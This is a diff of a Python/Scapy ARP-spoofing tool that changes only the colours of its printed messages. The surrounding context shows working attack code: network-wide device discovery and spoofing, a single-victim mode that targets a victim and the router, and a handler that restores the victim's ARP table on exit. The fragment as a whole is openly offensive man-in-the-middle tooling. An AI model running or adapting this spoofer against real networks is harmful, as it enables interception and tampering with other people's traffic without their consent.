@@ -26,7 +26,7 @@ def signal_handler(sig, frame):
   global routeur_ip
   global victim_mac
   global routeur_mac    
-  print("\n [!] Restoring the victim's network")
+  print("\033[1;42m \n [!] Restoring the victim's network")
   send(ARP(pdst=victim_ip, macdst=victim_mac, psrc=routeur_ip, macsrc=routeur_mac, op=2), count=5, inter=.2)
 
   sys.exit(0)
@@ -80,7 +80,7 @@ def arp_spoof2(): # Get all MAC addresses of the network + spoof them
       # For each response, we add ip and mac to the 'victimes' list
       victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
   # Print all network victims
-  print("\033[3;35m \nCONNECTED DEVICES ON THE NETWORK")
+  print("\033[3;45m \nCONNECTED DEVICES ON THE NETWORK")
   print("IP" + " "*18+"MAC")
   for x in victimes:
       print("{:16}    {}".format(x['ip'], x['mac']))
@@ -160,11 +160,11 @@ try:
     x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) # Since it is a single victim, we need its MAC (for the signal_handler function)
     victim_mac = x.hwsrc
 
-    print('\n[i] Attacking the victim ( {0} ), MAC address ( {1} )'.format(victim_ip, victim_mac))
+    print('\033[3;31m \n[i] Attacking the victim ( {0} ), MAC address ( {1} )'.format(victim_ip, victim_mac))
     print('[i] Attacking the router ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
     single() 
 
 except:
-  print("[!] Closing program...")
+  print("\033[1;41m [!] Closing program...")
                  
 # Stop program with CTRL+C
